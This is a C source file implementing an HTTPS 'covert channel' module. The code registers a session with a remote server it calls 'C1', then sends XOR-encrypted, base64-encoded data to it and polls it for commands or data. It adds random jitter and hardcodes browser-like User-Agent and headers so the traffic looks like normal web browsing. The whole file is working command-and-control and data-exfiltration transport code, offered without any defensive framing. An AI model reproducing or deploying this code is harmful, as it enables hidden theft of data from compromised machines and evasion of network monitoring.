/**
 * @file https_channel.c
 * @brief Implementation of HTTPS channel for covert data transmission
 * @author iamtomasanderson@gmail.com (https://github.com/Personaz1/)
 * @date 2023-09-01
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "../include/covert_channel.h"

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <errno.h>
#endif

#ifdef USE_OPENSSL
#include <openssl/ssl.h>
#include <openssl/err.h>
#endif

#define HTTPS_BUFFER_SIZE 4096
#define HTTPS_MAX_HEADER_SIZE 2048
#define HTTPS_DEFAULT_PORT 443
#define HTTPS_TIMEOUT_SEC 30
#define HTTPS_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

// Common HTTP headers for GET requests
const char* COMMON_HEADERS[] = {
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate, br",
    "DNT: 1",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1",
    "Cache-Control: max-age=0"
};
#define NUM_COMMON_HEADERS (sizeof(COMMON_HEADERS) / sizeof(COMMON_HEADERS[0]))

typedef struct {
    char* server_host;
    int server_port;
    char* uri_path;
    EncryptionAlgorithm encryption;
    char* encryption_key;
    int key_length;
    int jitter_ms;
    
#ifdef USE_OPENSSL
    SSL_CTX* ssl_ctx;
    SSL* ssl;
#endif

    int socket;
    int connected;
    char session_id[33]; // 32 hex chars + null terminator
} HttpsChannelData;

// Forward declarations
static char* https_encode_data(const unsigned char* data, size_t data_len, size_t* out_len);
static unsigned char* https_decode_data(const char* encoded, size_t encoded_len, size_t* out_len);
static int https_send_request(HttpsChannelData* channel, const char* method, const char* endpoint, const char* data, size_t data_len, char* response, size_t response_size);

CovertChannelHandle https_channel_init(const CovertChannelConfig* config) {
    if (!config || !config->server_address) {
        return NULL;
    }

    HttpsChannelData* channel = (HttpsChannelData*)calloc(1, sizeof(HttpsChannelData));
    if (!channel) {
        return NULL;
    }

    // Initialize with defaults
    channel->server_port = HTTPS_DEFAULT_PORT;
    channel->jitter_ms = config->jitter_ms >= 0 ? config->jitter_ms : 0;
    channel->connected = 0;
    channel->socket = -1;

    // Parse server address (hostname:port)
    char* server_address = strdup(config->server_address);
    if (!server_address) {
        free(channel);
        return NULL;
    }

    char* port_str = strchr(server_address, ':');
    if (port_str) {
        *port_str = '\0';
        port_str++;
        channel->server_port = atoi(port_str);
    }

    channel->server_host = strdup(server_address);
    free(server_address);
    
    if (!channel->server_host) {
        free(channel);
        return NULL;
    }

    // Set URI path (default to root if not specified)
    channel->uri_path = strdup(config->endpoint ? config->endpoint : "/");
    if (!channel->uri_path) {
        free(channel->server_host);
        free(channel);
        return NULL;
    }

    // Copy encryption settings
    channel->encryption = config->encryption;
    if (config->encryption_key && config->key_length > 0) {
        channel->encryption_key = (char*)malloc(config->key_length);
        if (!channel->encryption_key) {
            free(channel->uri_path);
            free(channel->server_host);
            free(channel);
            return NULL;
        }
        memcpy(channel->encryption_key, config->encryption_key, config->key_length);
        channel->key_length = config->key_length;
    }

    // Generate random session ID (32 hex chars)
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 16; i++) {
        sprintf(&channel->session_id[i*2], "%02x", rand() % 256);
    }

#ifdef USE_OPENSSL
    // Initialize OpenSSL if available
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    channel->ssl_ctx = SSL_CTX_new(TLS_client_method());
    if (!channel->ssl_ctx) {
        free(channel->encryption_key);
        free(channel->uri_path);
        free(channel->server_host);
        free(channel);
        return NULL;
    }
#endif

#ifdef _WIN32
    // Initialize Winsock on Windows
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
#ifdef USE_OPENSSL
        SSL_CTX_free(channel->ssl_ctx);
#endif
        free(channel->encryption_key);
        free(channel->uri_path);
        free(channel->server_host);
        free(channel);
        return NULL;
    }
#endif

    return (CovertChannelHandle)channel;
}

int https_channel_connect(CovertChannelHandle handle) {
    HttpsChannelData* channel = (HttpsChannelData*)handle;
    if (!channel) {
        return -1;
    }

    struct addrinfo hints, *result, *rp;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = 0;
    hints.ai_protocol = 0;

    char port_str[6];
    snprintf(port_str, sizeof(port_str), "%d", channel->server_port);

    if (getaddrinfo(channel->server_host, port_str, &hints, &result) != 0) {
        return -1;
    }

    // Try each address until we successfully connect
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        channel->socket = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (channel->socket == -1) {
            continue;
        }

        if (connect(channel->socket, rp->ai_addr, rp->ai_addrlen) != -1) {
            break; // Success
        }

#ifdef _WIN32
        closesocket(channel->socket);
#else
        close(channel->socket);
#endif
        channel->socket = -1;
    }

    freeaddrinfo(result);

    if (channel->socket == -1) {
        return -1; // Failed to connect
    }

#ifdef USE_OPENSSL
    // Setup SSL connection
    channel->ssl = SSL_new(channel->ssl_ctx);
    if (!channel->ssl) {
#ifdef _WIN32
        closesocket(channel->socket);
#else
        close(channel->socket);
#endif
        channel->socket = -1;
        return -1;
    }

    SSL_set_fd(channel->ssl, channel->socket);
    
    if (SSL_connect(channel->ssl) != 1) {
        SSL_free(channel->ssl);
#ifdef _WIN32
        closesocket(channel->socket);
#else
        close(channel->socket);
#endif
        channel->socket = -1;
        return -1;
    }
#endif

    // Registration request with C1
    char endpoint[256];
    snprintf(endpoint, sizeof(endpoint), "%s/register", channel->uri_path);
    
    char req_data[64];
    snprintf(req_data, sizeof(req_data), "session=%s&type=https", channel->session_id);
    
    char response[HTTPS_BUFFER_SIZE] = {0};
    
    int ret = https_send_request(channel, "POST", endpoint, req_data, strlen(req_data), response, HTTPS_BUFFER_SIZE);
    if (ret <= 0 || strstr(response, "OK") == NULL) {
        https_channel_cleanup(handle);
        return -1;
    }

    channel->connected = 1;
    return 0;
}

int https_channel_send(CovertChannelHandle handle, const unsigned char* data, size_t data_len) {
    HttpsChannelData* channel = (HttpsChannelData*)handle;
    if (!channel || !channel->connected || !data || data_len == 0) {
        return -1;
    }

    // Add random jitter delay
    if (channel->jitter_ms > 0) {
        int delay = rand() % channel->jitter_ms;
#ifdef _WIN32
        Sleep(delay);
#else
        usleep(delay * 1000);
#endif
    }

    // Encrypt data if encryption is enabled
    unsigned char* encrypted_data = (unsigned char*)data;
    size_t encrypted_len = data_len;
    unsigned char* temp_buffer = NULL;
    
    if (channel->encryption != ENC_NONE && channel->encryption_key) {
        temp_buffer = (unsigned char*)malloc(data_len + 32); // Extra space for padding
        if (!temp_buffer) {
            return -1;
        }
        
        // Placeholder for actual encryption (would implement AES, etc. here)
        // For now, just use simple XOR to show the concept
        for (size_t i = 0; i < data_len; i++) {
            temp_buffer[i] = data[i] ^ channel->encryption_key[i % channel->key_length];
        }
        
        encrypted_data = temp_buffer;
        encrypted_len = data_len; // Actual encryption might change length
    }
    
    // Encode the encrypted data (base64 or similar)
    size_t encoded_len = 0;
    char* encoded_data = https_encode_data(encrypted_data, encrypted_len, &encoded_len);
    
    if (temp_buffer) {
        free(temp_buffer);
    }
    
    if (!encoded_data) {
        return -1;
    }
    
    // Create endpoint with session ID
    char endpoint[256];
    snprintf(endpoint, sizeof(endpoint), "%s/data?session=%s", channel->uri_path, channel->session_id);
    
    // Send the encoded data to the server
    char response[HTTPS_BUFFER_SIZE] = {0};
    int res = https_send_request(channel, "POST", endpoint, encoded_data, encoded_len, response, HTTPS_BUFFER_SIZE);
    
    free(encoded_data);
    
    if (res <= 0) {
        return -1;
    }
    
    return data_len; // Return original data length on success
}

int https_channel_receive(CovertChannelHandle handle, unsigned char* buffer, size_t buffer_size) {
    HttpsChannelData* channel = (HttpsChannelData*)handle;
    if (!channel || !channel->connected || !buffer || buffer_size == 0) {
        return -1;
    }

    // Add random jitter delay
    if (channel->jitter_ms > 0) {
        int delay = rand() % channel->jitter_ms;
#ifdef _WIN32
        Sleep(delay);
#else
        usleep(delay * 1000);
#endif
    }

    // Create endpoint to poll for data
    char endpoint[256];
    snprintf(endpoint, sizeof(endpoint), "%s/poll?session=%s", channel->uri_path, channel->session_id);
    
    // Send GET request to check for data
    char response[HTTPS_BUFFER_SIZE] = {0};
    int res = https_send_request(channel, "GET", endpoint, NULL, 0, response, HTTPS_BUFFER_SIZE);
    
    if (res <= 0) {
        return 0; // No data available or error
    }
    
    // Find the response body (after \r\n\r\n)
    char* body = strstr(response, "\r\n\r\n");
    if (!body) {
        return 0;
    }
    body += 4; // Skip \r\n\r\n
    
    // Decode the response
    size_t decoded_len = 0;
    unsigned char* decoded_data = https_decode_data(body, strlen(body), &decoded_len);
    
    if (!decoded_data) {
        return 0;
    }
    
    // Decrypt if encryption was used
    if (channel->encryption != ENC_NONE && channel->encryption_key) {
        // Placeholder for actual decryption (would implement AES, etc. here)
        // For simplicity, just using XOR
        for (size_t i = 0; i < decoded_len; i++) {
            decoded_data[i] = decoded_data[i] ^ channel->encryption_key[i % channel->key_length];
        }
    }
    
    // Copy data to output buffer, truncating if necessary
    size_t copy_len = (decoded_len < buffer_size) ? decoded_len : buffer_size;
    memcpy(buffer, decoded_data, copy_len);
    
    free(decoded_data);
    return (int)copy_len;
}

void https_channel_cleanup(CovertChannelHandle handle) {
    HttpsChannelData* channel = (HttpsChannelData*)handle;
    if (!channel) {
        return;
    }

    // Close connection if active
    if (channel->connected) {
        // Attempt to deregister with server
        char endpoint[256];
        snprintf(endpoint, sizeof(endpoint), "%s/unregister?session=%s", channel->uri_path, channel->session_id);
        
        char response[HTTPS_BUFFER_SIZE];
        https_send_request(channel, "GET", endpoint, NULL, 0, response, HTTPS_BUFFER_SIZE);
        
        channel->connected = 0;
    }

#ifdef USE_OPENSSL
    if (channel->ssl) {
        SSL_shutdown(channel->ssl);
        SSL_free(channel->ssl);
    }
    
    if (channel->ssl_ctx) {
        SSL_CTX_free(channel->ssl_ctx);
    }
#endif

    if (channel->socket != -1) {
#ifdef _WIN32
        closesocket(channel->socket);
        WSACleanup();
#else
        close(channel->socket);
#endif
    }

    if (channel->encryption_key) {
        free(channel->encryption_key);
    }
    
    free(channel->uri_path);
    free(channel->server_host);
    free(channel);
}

// Helper function to create and send an HTTP request
static int https_send_request(HttpsChannelData* channel, const char* method, const char* endpoint, const char* data, size_t data_len, char* response, size_t response_size) {
    if (!channel || !method || !endpoint || !response) {
        return -1;
    }

    char request[HTTPS_MAX_HEADER_SIZE] = {0};
    char* ptr = request;
    int remaining = HTTPS_MAX_HEADER_SIZE;

    // Add request line
    int written = snprintf(ptr, remaining, "%s %s HTTP/1.1\r\n", method, endpoint);
    ptr += written;
    remaining -= written;

    // Add Host header
    written = snprintf(ptr, remaining, "Host: %s\r\n", channel->server_host);
    ptr += written;
    remaining -= written;

    // Add User-Agent header
    written = snprintf(ptr, remaining, "User-Agent: %s\r\n", HTTPS_USER_AGENT);
    ptr += written;
    remaining -= written;

    // Add common headers to mimic normal browser traffic
    for (int i = 0; i < NUM_COMMON_HEADERS; i++) {
        written = snprintf(ptr, remaining, "%s\r\n", COMMON_HEADERS[i]);
        ptr += written;
        remaining -= written;
    }

    // Add Content-Length if we have data
    if (data && data_len > 0) {
        written = snprintf(ptr, remaining, "Content-Type: application/x-www-form-urlencoded\r\n");
        ptr += written;
        remaining -= written;
        
        written = snprintf(ptr, remaining, "Content-Length: %zu\r\n", data_len);
        ptr += written;
        remaining -= written;
    }

    // End headers
    written = snprintf(ptr, remaining, "\r\n");
    ptr += written;
    remaining -= written;

    // Add body if we have data
    if (data && data_len > 0 && remaining >= data_len) {
        memcpy(ptr, data, data_len);
        ptr += data_len;
    }

    // Send the request
    int total_sent = 0;
    int total_length = (int)(ptr - request);
    
#ifdef USE_OPENSSL
    if (channel->ssl) {
        while (total_sent < total_length) {
            int sent = SSL_write(channel->ssl, request + total_sent, total_length - total_sent);
            if (sent <= 0) {
                return -1;
            }
            total_sent += sent;
        }
    } else {
#endif
        while (total_sent < total_length) {
            int sent = send(channel->socket, request + total_sent, total_length - total_sent, 0);
            if (sent <= 0) {
                return -1;
            }
            total_sent += sent;
        }
#ifdef USE_OPENSSL
    }
#endif

    // Receive the response
    int total_received = 0;
    int bytes_received = 0;
    
    // Set socket timeout
#ifdef _WIN32
    DWORD timeout = HTTPS_TIMEOUT_SEC * 1000;
    setsockopt(channel->socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    struct timeval tv;
    tv.tv_sec = HTTPS_TIMEOUT_SEC;
    tv.tv_usec = 0;
    setsockopt(channel->socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
#endif

    // Read the response
    memset(response, 0, response_size);
    
#ifdef USE_OPENSSL
    if (channel->ssl) {
        do {
            bytes_received = SSL_read(channel->ssl, response + total_received, response_size - total_received - 1);
            if (bytes_received > 0) {
                total_received += bytes_received;
            }
        } while (bytes_received > 0 && total_received < response_size - 1);
    } else {
#endif
        do {
            bytes_received = recv(channel->socket, response + total_received, response_size - total_received - 1, 0);
            if (bytes_received > 0) {
                total_received += bytes_received;
            }
        } while (bytes_received > 0 && total_received < response_size - 1);
#ifdef USE_OPENSSL
    }
#endif

    response[total_received] = '\0';
    return total_received;
}

// Base64 encoding/decoding functions
static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char* https_encode_data(const unsigned char* data, size_t data_len, size_t* out_len) {
    if (!data || data_len == 0) {
        return NULL;
    }
    
    // Calculate output size
    *out_len = 4 * ((data_len + 2) / 3);
    char* encoded = (char*)malloc(*out_len + 1); // +1 for null terminator
    if (!encoded) {
        return NULL;
    }
    
    size_t i, j;
    for (i = 0, j = 0; i < data_len; i += 3, j += 4) {
        uint32_t octet_a = i < data_len ? data[i] : 0;
        uint32_t octet_b = i + 1 < data_len ? data[i + 1] : 0;
        uint32_t octet_c = i + 2 < data_len ? data[i + 2] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded[j] = base64_chars[(triple >> 18) & 0x3F];
        encoded[j + 1] = base64_chars[(triple >> 12) & 0x3F];
        encoded[j + 2] = base64_chars[(triple >> 6) & 0x3F];
        encoded[j + 3] = base64_chars[triple & 0x3F];
    }
    
    // Add padding if needed
    if (data_len % 3 == 1) {
        encoded[*out_len - 2] = '=';
        encoded[*out_len - 1] = '=';
    } else if (data_len % 3 == 2) {
        encoded[*out_len - 1] = '=';
    }
    
    encoded[*out_len] = '\0';
    return encoded;
}

static int base64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1; // Invalid character
}

static unsigned char* https_decode_data(const char* encoded, size_t encoded_len, size_t* out_len) {
    if (!encoded || encoded_len == 0) {
        return NULL;
    }
    
    // Calculate padding
    size_t padding = 0;
    if (encoded_len > 0 && encoded[encoded_len - 1] == '=') padding++;
    if (encoded_len > 1 && encoded[encoded_len - 2] == '=') padding++;
    
    // Calculate output size
    *out_len = 3 * encoded_len / 4 - padding;
    unsigned char* decoded = (unsigned char*)malloc(*out_len);
    if (!decoded) {
        return NULL;
    }
    
    size_t i, j;
    for (i = 0, j = 0; i < encoded_len - padding; i += 4, j += 3) {
        int sextet_a = base64_decode_char(encoded[i]);
        int sextet_b = base64_decode_char(encoded[i + 1]);
        int sextet_c = i + 2 < encoded_len ? base64_decode_char(encoded[i + 2]) : 0;
        int sextet_d = i + 3 < encoded_len ? base64_decode_char(encoded[i + 3]) : 0;
        
        if (sextet_a < 0 || sextet_b < 0 || sextet_c < 0 || sextet_d < 0) {
            free(decoded);
            return NULL; // Invalid character
        }
        
        uint32_t triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;
        
        if (j < *out_len) decoded[j] = (triple >> 16) & 0xFF;
        if (j + 1 < *out_len) decoded[j + 1] = (triple >> 8) & 0xFF;
        if (j + 2 < *out_len) decoded[j + 2] = triple & 0xFF;
    }
    
    return decoded;
} 